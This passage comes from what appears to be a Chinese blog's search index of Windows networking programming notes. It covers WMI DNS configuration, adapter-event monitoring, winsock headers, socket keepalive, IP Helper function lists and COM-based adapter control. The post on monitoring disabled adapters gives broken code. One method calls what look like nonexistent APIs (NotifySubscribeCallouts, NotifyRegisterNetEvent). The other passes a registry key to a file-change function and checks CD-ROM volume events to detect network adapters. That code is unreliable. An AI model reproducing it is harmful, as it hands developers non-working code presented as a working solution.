&lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; hres = p_service_-&gt;GetObject(_bstr_t(L&quot;Win32_NetworkAdapterConfiguration&quot;), 0, NULL, &amp;p_config, NULL); //ASSERT_THROW(SUCCEEDED(hres), &quot;GetObject Win32_NetworkAdapterConfiguration failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;GetObject failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; is_init_ = true; return true;&#125;std::shared_ptr&lt;SAFEARRAY&gt; NetConfig::create_SAFEARRAY(const std::vector&lt;std::string&gt; &amp;args)&#123; SAFEARRAY *psa = SafeArrayCreateVector(VT_BSTR, 0, args.size()); long idx[] = &#123; 0 &#125;; for (int i = 0; i &lt; args.size(); i++) &#123; std::wstring_convert&lt;std::codecvt_utf8_utf16&lt;wchar_t&gt;, wchar_t&gt; conversion; BSTR ip = SysAllocString(conversion.from_bytes(args[i]).c_str()); idx[0] = i; if (FAILED(SafeArrayPutElement(psa, idx, ip))) &#123; return (false); &#125; SysFreeString(ip); &#125; return shared_ptr&lt;SAFEARRAY&gt;(psa, [](SAFEARRAY *psa) &#123;SafeArrayDestroy(psa); &#125;);&#125;bool NetConfig::set_dns_base(bool is_auto, const std::string &amp; default_dns, const std::string &amp; backup_dns)&#123; bool rt = false; if (!init()) return rt; IWbemClassObject *params = NULL; IWbemClassObject *paramsInst = NULL; p_config-&gt;GetMethod(_bstr_t(&quot;SetDNSServerSearchOrder&quot;), 0, &amp;params, NULL); params-&gt;SpawnInstance(0, &amp;paramsInst); shared_ptr&lt;SAFEARRAY&gt; p1; if (is_auto) &#123; paramsInst-&gt;Put(L&quot;DNSServerSearchOrder&quot;, 0, NULL, NULL); &#125; else &#123; if (backup_dns.size()) &#123; p1 = create_SAFEARRAY(&#123; default_dns, backup_dns &#125;); &#125; else &#123; p1 = create_SAFEARRAY(&#123; default_dns &#125;); &#125; VARIANT paramVt; paramVt.vt = VT_ARRAY | VT_BSTR; paramVt.parray = p1.get(); paramsInst-&gt;Put(L&quot;DNSServerSearchOrder&quot;, 0, &amp;paramVt, NULL); &#125; rt = exec_method(L&quot;SetDNSServerSearchOrder&quot;, paramsInst); if (params) &#123; params-&gt;Release(); &#125; return rt;&#125;bool NetConfig::exec_method(const wchar_t * method, IWbemClassObject * params_instance)&#123; bool rt = false; IWbemClassObject *results = NULL; auto res = p_service_-&gt;ExecMethod(path_.bstrVal, _bstr_t(method), 0, NULL, params_instance, &amp;results, NULL); if (SUCCEEDED(res)) &#123; VARIANT vtRet; VariantInit(&amp;vtRet); if (!FAILED(results-&gt;Get(L&quot;ReturnValue&quot;, 0, &amp;vtRet, NULL, 0))) &#123; if (vtRet.uintVal == 0 || vtRet.uintVal == 1) &#123; rt = true; &#125; else &#123; last_error_code_ = vtRet.uintVal;#ifdef _DEBUG wcout &lt;&lt; method &lt;&lt; &quot; failed, result: &quot; &lt;&lt; last_error_code_ &lt;&lt; endl;#endif &#125; &#125;#ifdef _DEBUG else &#123; cout &lt;&lt; &quot;ExecMethod Get ReturnValue failed: &quot; &lt;&lt; res &lt;&lt; endl; &#125;#endif VariantClear(&amp;vtRet); results-&gt;Release(); &#125;#ifdef _DEBUG else &#123; cout &lt;&lt; &quot;ExecMethod failed: &quot; &lt;&lt; res &lt;&lt; endl; &#125;#endif if (params_instance) &#123; params_instance-&gt;Release(); &#125; return rt;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"网卡","slug":"网卡","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】监控网卡事件","date":"2023-10-27T01:24:02.075Z","path":"A_OS/Windows/网络helper/监控网卡禁用事件/","text":"概述：监控网卡被禁用事件。 方法一可以使用Win32 API中的 NotifySubscribeCallouts 和 NotifyRegisterNetEvent api 函数来监控网络适配器状态的改变，包括被禁用的事件。 具体步骤如下： 使用NotifySubscribeCallouts函数来注册一个回调函数，当网络适配器状态改变时会调用该函数。 在回调函数中使用NotifyRegisterNetEvent函数来注册一个网络事件，比如网络适配器被禁用。 监听回调函数中传递的事件类型，当事件类型为被禁用时，执行自己的逻辑处理。 示例代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;ipexport.h&gt;using namespace std;BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);void CALLBACKNetEventCallback(PVOID pCallerContext, ULONG NotificationType, PVOID Notification);int main()&#123; // 注册控制事件处理函数 SetConsoleCtrlHandler(HandlerRoutine, TRUE); HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL); HANDLE hWaitableHandle[2] = &#123; hEvent, INVALID_HANDLE_VALUE &#125;; // 注册网络事件回调函数 DWORD dwFlags = NOTIFY_FILTER_INTERFACE_CHANGE | NOTIFY_FILTER_DRIVER_LOADED; HMODULE hModule = NULL; PVOID pCallerContext = (PVOID)hEvent; HANDLE hNotifyObject = NULL; NotifySubscribeCallouts(dwFlags, NetEventCallback, pCallerContext, hModule, &amp;hNotifyObject); // 等待事件 DWORD dwWaitResult; do &#123; dwWaitResult = WaitForMultipleObjects(2, hWaitableHandle, FALSE, INFINITE); &#125; while (dwWaitResult != WAIT_OBJECT_0); // 取消订阅并关闭事件句柄 NotifyUnsubscribeCallouts(hNotifyObject); CloseHandle(hEvent); return 0;&#125;BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)&#123; switch (dwCtrlType) &#123; case CTRL_CLOSE_EVENT: printf(&quot; Close signal received.&quot;); return TRUE; default: return FALSE; &#125;&#125;void CALLBACK NetEventCallback(PVOID pCallerContext, ULONG NotificationType, PVOID Notification)&#123; switch (NotificationType) &#123; case NOTIFY_INTERFACE_ARRIVAL: printf(&quot; Interface arrival.&quot;); break; case NOTIFY_INTERFACE_REMOVAL: printf(&quot; Interface removal.&quot;); break; case NOTIFY_INTERFACE_ENABLED: printf(&quot; Interface enabled.&quot;); break; case NOTIFY_INTERFACE_DISABLED: printf(&quot; Interface disabled.&quot;); break; default: printf(&quot; Unknown notification type.&quot;); break; &#125; PIP_INTERFACE_INFO pIfInfo = (PIP_INTERFACE_INFO)Notification; // 监听网卡被禁用事件 if (NotificationType == NOTIFY_INTERFACE_DISABLED) &#123; printf(&quot; Interface % ws has been disabled.&quot;, pIfInfo-&gt;Adapter[0].Name); &#125;&#125; 注意事项： 如果需要使用NotifyRegisterNetEvent函数，需要将应用程序编译为驱动程序或系统服务，因为这个函数需要管理员权限。 回调函数中不能阻塞或进行耗时操作，因为这会影响系统功能的正常运作。 可以使用SetConsoleCtrlHandler函数注册控制事件处理函数，以便在收到控制事件时可以及时退出程序。 方法二参考注册设备通知 - Win32 apps | Microsoft Learn 要获取 Windows 网卡被禁用事件，您可以使用以下步骤： 使用 Windows API 函数注册网络配置更改通知。使用以下代码： 1234567891011121314151617181920212223HANDLE hNotify = NULL;HDEVNOTIFY hDevNotify = NULL;hNotify = FindFirstChangeNotificationW( HKEY_LOCAL_MACHINE, L&quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Network&quot;, FALSE, FILE_NOTIFY_CHANGE_LAST_WRITE);if (hNotify == INVALID_HANDLE_VALUE)&#123; // Handle error&#125;hDevNotify = RegisterDeviceNotification( hwnd, &amp;filter, DEVICE_NOTIFY_WINDOW_HANDLE);if (hDevNotify == NULL)&#123; // Handle error&#125; 其中，HWND是接收通知的窗口句柄，filter是一些条件，例如通知类型，设备范围等。 在您的窗口过程函数中处理通知消息。 它将提供一个 lParam 参数，该参数是一个包含有关更改的结构体。 您可以使用以下代码来检查是否禁用了任何网络适配器： 12345678910111213141516171819202122232425262728case WM_DEVICECHANGE: PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam; if (pHdr-&gt;dbch_devicetype == DBT_DEVTYP_VOLUME) &#123; PDEV_BROADCAST_VOLUME pVol = (PDEV_BROADCAST_VOLUME)pHdr; // Check if network adapter is disabled if (pVol-&gt;dbcv_flags &amp; DBTF_MEDIA) // Media is removed &#123; // Check if any network adapter is disabled DWORD dwDriveMask = pVol-&gt;dbcv_unitmask; if (dwDriveMask != 0) &#123; for (int i = 0; i &lt; 26; i++) &#123; if ((dwDriveMask &amp; 0x01) == 0x01) &#123; char szDrive[4] = &#123; &#x27;A&#x27; + i, &#x27;:&#x27;, &#x27;\\\\&#x27;, &#x27;\\0&#x27; &#125;; if (GetDriveType(szDrive) == DRIVE_CDROM) &#123; // Network adapter on this drive is disabled &#125; &#125; dwDriveMask &gt;&gt; = 1; &#125; &#125; &#125; &#125; return TRUE; 这段代码检查网络适配器是否被禁用，并根据需要执行操作。 请注意，这些代码只是一种参考。要使它们正常工作，您需要将它们植入到您的代码中，并根据需要进行修改。","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"网卡","slug":"网卡","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】使用 winsock2 相关函数","date":"2023-10-27T01:24:02.073Z","path":"A_OS/Windows/网络helper/使用winsock2/","text":"winsock2.h在最开始include ip的一些工具函数在 Iphlpapi.h 12345#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;) windows.h 默认加载 winsock版本1.winsock2.h 默认加 windows.h 不得不加 windows.h 时候记得加宏 WIN32_LEAN_AND_MEAN 123456789101112131415#ifndef WIN32_LEAN_AND_MEAN#define WIN32_LEAN_AND_MEAN#endif#include &lt;windows.h&gt;#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;iphlpapi.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;)int main() &#123; return 0;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"winsock","slug":"winsock","permalink":"http://example.com/tags/winsock/"},{"name":"iphelper","slug":"iphelper","permalink":"http://example.com/tags/iphelper/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】socket 保活","date":"2023-10-27T01:24:02.073Z","path":"A_OS/Windows/网络helper/socket保活/","text":"概述：Socket 保活 123456789101112131415161718192021222324252627282930313233343536373839404142BOOL _KeepAlive(SP_SOCKET fd)&#123; //定义结构及宏 struct KeepAlive &#123; u_long onoff; u_long keepalivetime; u_long keepaliveinterval; &#125;;#define SIO_KEEPALIVE_VALS _WSAIOW(IOC_VENDOR,4) //KeepAlive实现 KeepAlive inKeepAlive = &#123; 0 &#125;; //输入参数 unsigned long ulInLen = sizeof(KeepAlive); KeepAlive outKeepAlive = &#123; 0 &#125;; //输出参数 unsigned long ulOutLen = sizeof(KeepAlive); unsigned long ulBytesReturn = 0; //keepalive xp以前的系统发送5次，xp之后的系统发送10 inKeepAlive.onoff = 1; inKeepAlive.keepaliveinterval = 5000; //两次KeepAlive探测间的时间间隔 inKeepAlive.keepalivetime = 5000; //开始首次KeepAlive探测前的TCP空闭时间 if (WSAIoctl((SOCKET)fd, SIO_KEEPALIVE_VALS, (LPVOID)&amp;inKeepAlive, ulInLen, (LPVOID)&amp;outKeepAlive, ulOutLen, &amp;ulBytesReturn, NULL, NULL) == SOCKET_ERROR) &#123; LOGT(&quot;Set Keep Alive FAILED.&quot;); return FALSE; &#125; else &#123; LOGT(&quot;Set Keep Alive OK.&quot;); return TRUE; &#125;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】iphepler 接口整理","date":"2023-10-27T01:24:02.072Z","path":"A_OS/Windows/网络helper/iphelper接口整理/","text":"The following functions are used in Windows networking: Obsolete FunctionsThe following function is provided only for compatibility with 16-bit versions of Windows: windows提供了大量的网络辅助函数，如下也为探讨内容： IP Helper FunctionsThe following functions retrieve and modify configuration settings for the TCP&#x2F;IP transport on the local computer. The following categorical listing can help determine which collection of functions is best suited for a given task: Adapter Management GetAdapterIndex GetAdaptersAddresses GetAdaptersInfo GetPerAdapterInfo GetUniDirectionalAdapterInfo Address Resolution Protocol (ARP) Management CreateIpNetEntry CreateProxyArpEntry DeleteIpNetEntry DeleteProxyArpEntry FlushIpNetTable GetIpNetTable SendARP SetIpNetEntry Interface Conversion ConvertInterfaceAliasToLuid ConvertInterfaceGuidToLuid ConvertInterfaceIndexToLuid ConvertInterfaceLuidToAlias ConvertInterfaceLuidToGuid ConvertInterfaceLuidToIndex ConvertInterfaceLuidToNameA ConvertInterfaceLuidToNameW ConvertInterfaceNameToLuidA ConvertInterfaceNameToLuidW if_indextoname if_nametoindex Interface Management GetFriendlyIfIndex GetIfEntry GetIfEntry2 GetIfStackTable GetIfTable GetIfTable2 GetIfTable2Ex GetInterfaceInfo GetInvertedIfStackTable GetIpInterfaceEntry GetIpInterfaceTable GetNumberOfInterfaces InitializeIpInterfaceEntry SetIfEntry SetIpInterfaceEntry Internet Protocol (IP) and Internet Control Message Protocol (ICMP) GetIcmpStatistics GetIpStatistics Icmp6CreateFile Icmp6ParseReplies Icmp6SendEcho2 IcmpCloseHandle IcmpCreateFile IcmpParseReplies IcmpSendEcho IcmpSendEcho2 IcmpSendEcho2Ex SetIpTTL IP Address Management AddIPAddress CreateAnycastIpAddressEntry CreateUnicastIpAddressEntry DeleteIPAddress DeleteAnycastIpAddressEntry DeleteUnicastIpAddressEntry GetAnycastIpAddressEntry GetAnycastIpAddressTable GetIpAddrTable GetMulticastIpAddressEntry GetMulticastIpAddressTable GetUnicastIpAddressEntry GetUnicastIpAddressTable InitializeUnicastIpAddressEntry IpReleaseAddress IpRenewAddress NotifyStableUnicastIpAddressTable SetUnicastIpAddressEntry IP Address String Conversion RtlIpv4AddressToString RtlIpv4AddressToStringEx RtlIpv4StringToAddress RtlIpv4StringToAddressEx RtlIpv6AddressToString RtlIpv6AddressToStringEx RtlIpv6StringToAddress RtlIpv6StringToAddressEx IP Neighbor Address Management CreateIpNetEntry2 DeleteIpNetEntry2 FlushIpNetTable2 GetIpNetEntry2 GetIpNetTable2 ResolveIpNetEntry2 ResolveNeighbor SetIpNetEntry2 IP Path Management FlushIpPathTable GetIpPathEntry GetIpPathTable IP Route Management CreateIpForwardEntry CreateIpForwardEntry2 DeleteIpForwardEntry DeleteIpForwardEntry2 EnableRouter GetBestInterface GetBestInterfaceEx GetBestRoute GetBestRoute2 GetIpForwardEntry2 GetIpForwardTable GetIpForwardTable2 GetRTTAndHopCount InitializeIpForwardEntry SetIpForwardEntry SetIpForwardEntry2 SetIpStatistics SetIpStatisticsEx UnenableRouter IP Table Memory Management FreeMibTable IP Utility ConvertIpv4MaskToLength ConvertLengthToIpv4Mask CreateSortedAddressPairs ParseNetworkString Network Configuration GetNetworkParams Notification CancelMibChangeNotify2 NotifyAddrChange","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"ip","slug":"ip","permalink":"http://example.com/tags/ip/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】C++ 通过 COM 组件 启用\\禁用\\查看 网卡状态","date":"2023-10-27T01:24:02.071Z","path":"A_OS/Windows/网络helper/COM查看网卡状态/","text":"概述：通过 COM 对象操作网卡 123456789101112131415161718192021222324252627282930313233343536#include &lt;NetCon.h&gt;void ChangeNetState()&#123; CoInitialize(NULL); INetConnectionManager* pNetManager; INetConnection* pNetConnection; IEnumNetConnection* pEnum; if (S_OK != CoCreateInstance(CLSID_ConnectionManager, NULL, CLSCTX_SERVER, IID_INetConnectionManager, (void**)&amp;pNetManager)) &#123; return ; &#125; pNetManager-&gt;EnumConnections(NCME_DEFAULT, &amp;pEnum); pNetManager-&gt;Release(); if (NULL == pEnum) &#123; return ; &#125; ULONG celtFetched; while (pEnum-&gt;Next(1, &amp;pNetConnection, &amp;celtFetched) == S_OK) &#123; NETCON_PROPERTIES* properties; pNetConnection-&gt;GetProperties(&amp;properties); //properties-&gt;pszwName; //网络连接的名称 //properties-&gt;pszwDeviceName; //网卡名称 //properties-&gt;Status; //状态 //pNetConnection-&gt;Disconnect(); //禁用网卡 //pNetConnection-&gt;Connect(); //启用网卡 &#125; CoUninitialize(); return ;&#125; NETCON_PROPERTIES 结构体使用的变量为宽字符，在打印时需要在程序入口调用以下函数才能正确输出。 1setlocale(LC_CTYPE, &quot;chs&quot;);","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"网卡","slug":"网卡","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】监控指定网卡事件","date":"2023-10-27T01:24:02.070Z","path":"A_OS/Windows/网络helper/(超详细)监控网卡事件2/","text":"[toc] win com类和接口说明1. INetworkListManager INetworkListManager 接口提供了一组用于执行网络列表管理功能的方法。 [通过com组件获取系统网卡] INetworkListManager接口 INetworkListManager：：ClearSimulatedProfileInfo 清除以前通过 SetSimulatedProfileInfo 应用于 Internet 连接配置文件的连接配置文件值。 下一个 Internet 连接查询（通过 GetInternetConnectionProfile）将使用系统信息。 INetworkListManager：：get_IsConnected get_IsConnected 属性指定本地计算机是否具有网络连接。 INetworkListManager：：get_IsConnectedToInternet get_IsConnectedToInternet 属性指定本地计算机是否具有 Internet 连接。 INetworkListManager：：GetConnectivity GetConnectivity 方法返回计算机的整体连接状态。 INetworkListManager：：GetNetwork GetNetwork 方法基于提供的网络 ID 检索网络。 INetworkListManager：：GetNetworkConnection GetNetworkConnection 方法基于提供的网络连接 ID 检索网络。 INetworkListManager：：GetNetworkConnections GetNetworkConnections 方法枚举已建立的网络连接的完整列表。 INetworkListManager：：GetNetworks GetNetworks 方法检索本地计算机上可用的网络列表。 INetworkListManager：：SetSimulatedProfileInfo SetSimulatedProfileInfo 方法将一组特定的连接配置文件值应用于 Internet 连接配置文件，以支持特定按流量计费的 Internet 连接条件模拟。 使用参考： 123456789101112...IUnknown* pUnknown = NULL;HRESULT Result = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_IUnknown, (void**)&amp;pUnknown);if (SUCCEEDED(Result))&#123; INetworkListManager* pNetworkListManager = NULL; Result = pUnknown-&gt;QueryInterface(IID_INetworkListManager, (void**)&amp;pNetworkListManager); if (SUCCEEDED(Result)) &#123; &#125;... 2. INetConnectionManager 3. IConnectionPointContainer 支持可连接对象的连接点。 IConnectionPointContainer：：EnumConnectionPoints 创建枚举器对象以循环访问可连接对象中支持的所有连接点，每个传出 IID 一个连接点。 IConnectionPointContainer：：FindConnectionPoint 如果 IID 描述支持的传出接口，则返回指向指定 IID 的连接点的 IConnectionPoint 接口的指针。 使用参考： 12345678910111213...IConnectionPointContainer* pCPContainer = NULL;Result = pNetworkListManager-&gt;QueryInterface(IID_IConnectionPointContainer, (void**)&amp;pCPContainer);if (SUCCEEDED(Result))&#123; IConnectionPoint* pConnectPoint = NULL; Result = pCPContainer-&gt;FindConnectionPoint(IID_INetworkListManagerEvents, &amp;pConnectPoint); // 查找 IID 对应的连接点 if (SUCCEEDED(Result)) &#123; &#125;&#125;... 4. IConnectionPoint 支持可连接对象的连接点。通过 IConnectionPointContainer::FindConnectionPoint 获取。通过其函数 Advise 可以建立连接点对象与客户端接收器之间的连接。也就是可以通过此接口实现网络事件的监控。 第一个参数参考 netListmgr.h 使用参考： 123456789101112131415...IConnectionPoint* pConnectPoint = NULL;Result = pCPContainer-&gt;FindConnectionPoint(IID_INetworkListManagerEvents, &amp;pConnectPoint);if (SUCCEEDED(Result))&#123; DWORD Cookie = NULL; CNetworkMonitor networkMonitor; std::function&lt;void(bool)&gt; monitorFunc = std::bind(&amp;CNetworkMonitor::NetworkStatusChangedCallback, networkMonitor, std::placeholders::_1); // CNetworkListManagerEvent 为继承自 INetworkListManagerEvents 的类，重载了 ConnectivityChanged 函数 CNetworkListManagerEvent* pNetEvent = new(std::nothrow) CNetworkListManagerEvent(monitorFunc); if (pNetEvent) &#123; Result = pConnectPoint-&gt;Advise((IUnknown*)pNetEvent, &amp;Cookie); ... 5. INetConnectionhttps://learn.microsoft.com/en-us/windows/win32/api/netcon/nn-netcon-inetconnection 使用示例 1： 监控网络状态，同时可以监控wife的网络质量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;locale&gt;#include &lt;codecvt&gt;#include &lt;functional&gt;#include &lt;Windows.h&gt;#include &lt;netlistmgr.h&gt;#include &lt;atlbase.h&gt;#include &lt;objbase.h&gt;#include &lt;wtypes.h&gt;#include &lt;wlanapi.h&gt;#include &lt;netcon.h&gt;#include &lt;IPHlpApi.h&gt;#include &lt;comutil.h&gt;#pragma comment(lib, &quot;comsuppwd.lib&quot;)#pragma comment(lib, &quot;ole32.lib&quot;)#pragma comment(lib, &quot;wlanapi.lib&quot;)#pragma comment(lib, &quot;Iphlpapi.lib&quot;)static std::string WCharToMByte(LPCWSTR lpcwszStr)&#123; std::string str; DWORD dwMinSize = 0; LPSTR lpszStr = NULL; dwMinSize = WideCharToMultiByte(CP_OEMCP, NULL, lpcwszStr, -1, NULL, 0, NULL, FALSE); if (0 == dwMinSize) &#123; return FALSE; &#125; lpszStr = new char[dwMinSize]; WideCharToMultiByte(CP_OEMCP, NULL, lpcwszStr, -1, lpszStr, dwMinSize, NULL, FALSE); str = lpszStr; delete[] lpszStr; return str;&#125;static std::wstring GUIDToString(const GUID&amp; guid)&#123; OLECHAR guidString[40] = &#123; 0 &#125;; ::StringFromGUID2(guid, guidString, sizeof(guidString)); return guidString;&#125;static std::string UnicodeToUTF8(const std::wstring&amp; wstr)&#123; std::string ret; try &#123; std::wstring_convert&lt; std::codecvt_utf8&lt;wchar_t&gt; &gt; wcv; ret = wcv.to_bytes(wstr); &#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; e.what() &lt;&lt; std::endl; &#125; return ret;&#125;class NetWorkEvent : public INetworkConnectionEvents&#123;private: LONG _ref; std::function&lt;void()&gt; _callback;public: NetWorkEvent(const std::function&lt;void()&gt;&amp; cb); virtual HRESULT STDMETHODCALLTYPE NetworkConnectionConnectivityChanged( /* [in] */ GUID connectionId, /* [in] */ NLM_CONNECTIVITY newConnectivity); virtual HRESULT STDMETHODCALLTYPE NetworkConnectionPropertyChanged( /* [in] */ GUID connectionId, /* [in] */ NLM_CONNECTION_PROPERTY_CHANGE flags); STDMETHODIMP QueryInterface(REFIID refIID, void** pIFace); virtual ULONG __stdcall AddRef(void); virtual ULONG __stdcall Release(void);&#125;;NetWorkEvent::NetWorkEvent(const std::function&lt;void()&gt;&amp; cb) : _callback(cb)&#123;&#125;HRESULT NetWorkEvent::NetworkConnectionConnectivityChanged(GUID connectionId, NLM_CONNECTIVITY newConnectivity)&#123; std::wcout &lt;&lt; GUIDToString(connectionId) &lt;&lt; &quot; | NUL_CONNECTIVITY : &quot; &lt;&lt; newConnectivity &lt;&lt; std::endl; if (_callback) &#123; _callback(); &#125; return S_OK;&#125;HRESULT NetWorkEvent::NetworkConnectionPropertyChanged(GUID connectionId, NLM_CONNECTION_PROPERTY_CHANGE flags)&#123; return S_OK;&#125;STDMETHODIMP NetWorkEvent::QueryInterface(REFIID refIID, void** pIFace)&#123; HRESULT hr = S_OK; *pIFace = NULL; if (IsEqualIID(refIID, IID_IUnknown)) &#123; *pIFace = (IUnknown*)this; ((IUnknown*)*pIFace)-&gt;AddRef(); &#125; else if (IsEqualIID(refIID, IID_INetworkConnectionEvents)) &#123; *pIFace = (INetworkConnectionEvents*)this; ((IUnknown*)*pIFace)-&gt;AddRef(); &#125; else &#123; hr = E_NOINTERFACE; &#125; return hr;&#125;ULONG NetWorkEvent::AddRef(void)&#123; return (ULONG)InterlockedIncrement(&amp;_ref);&#125;ULONG NetWorkEvent::Release(void)&#123; LONG Result = InterlockedDecrement(&amp;_ref); if (Result == 0) delete this; return (ULONG)Result;&#125;enum NetworkType&#123; NotNetwork, Ethernet, Wlan,&#125;;enum WiFiQuality&#123; Weak, // (-INF, -70dBm) Fair, // [-70dBm, -60dBm) Good, // [-60dBm, -50dBm) Excellent // [-50dBm, +INF)&#125;;struct ConnectionInfo&#123; std::wstring guid; NetworkType type;&#125;;class NetworkMonitor&#123; friend void OnNotificationCallback(PWLAN_NOTIFICATION_DATA Data, PVOID context);public: NetworkMonitor(); ~NetworkMonitor(); std::vector&lt;ConnectionInfo&gt; GetNetworkConnections(); NetworkType GetNetAdpaterType(const std::wstring&amp; guid); void OnNetworkStatusChange(); WiFiQuality GetWiFiSignalQuality(const std::wstring&amp; guid); void OnWiFiQualityChange(const GUID&amp; guid); void ShowNetworkStatus();private: std::unique_ptr&lt;NetWorkEvent&gt; _networkEvent; DWORD _cookie; CComPtr&lt;INetworkListManager&gt; _pNLM; CComPtr&lt;IConnectionPointContainer&gt; _pCpc; CComPtr&lt;IConnectionPoint&gt; _pConnectionPoint; HANDLE _wlanHandle;&#125;;static NetworkMonitor* InstanceOfNetworkMonitor()&#123; static NetworkMonitor instance; return &amp;instance;&#125;NetworkMonitor::NetworkMonitor()&#123; CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE); HRESULT hr = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_INetworkListManager, (LPVOID*)&amp;_pNLM); hr = _pNLM-&gt;QueryInterface(IID_IConnectionPointContainer, (void**)&amp;_pCpc); hr = _pCpc-&gt;FindConnectionPoint(IID_INetworkConnectionEvents, &amp;_pConnectionPoint); _networkEvent = std::make_unique&lt;NetWorkEvent&gt;(std::bind(&amp;NetworkMonitor::OnNetworkStatusChange, this)); hr = _pConnectionPoint-&gt;Advise((IUnknown*)_networkEvent.get(), &amp;_cookie);&#125;NetworkMonitor::~NetworkMonitor()&#123; if (_pConnectionPoint) &#123; _pConnectionPoint-&gt;Unadvise(_cookie); &#125; CloseHandle(_wlanHandle); CoUninitialize();&#125;void OnNotificationCallback(PWLAN_NOTIFICATION_DATA Data, PVOID context)&#123; if (Data != NULL &amp;&amp; Data-&gt;NotificationSource == WLAN_NOTIFICATION_SOURCE_MSM &amp;&amp; Data-&gt;NotificationCode == wlan_notification_msm_signal_quality_change) &#123; WLAN_SIGNAL_QUALITY Qality = (WLAN_SIGNAL_QUALITY)Data-&gt;pData; std::cout &lt;&lt; &quot;WiFi OnNotification Qality : &quot; &lt;&lt; Qality &lt;&lt; std::endl; InstanceOfNetworkMonitor()-&gt;OnWiFiQualityChange(Data-&gt;InterfaceGuid); &#125;&#125;std::vector&lt;ConnectionInfo&gt; NetworkMonitor::GetNetworkConnections()&#123; std::vector&lt;ConnectionInfo&gt; result; CComPtr&lt;IEnumNetworkConnections&gt; enumConnectons; if (FAILED(_pNLM-&gt;GetNetworkConnections(&amp;enumConnectons))) &#123; std::cerr &lt;&lt; 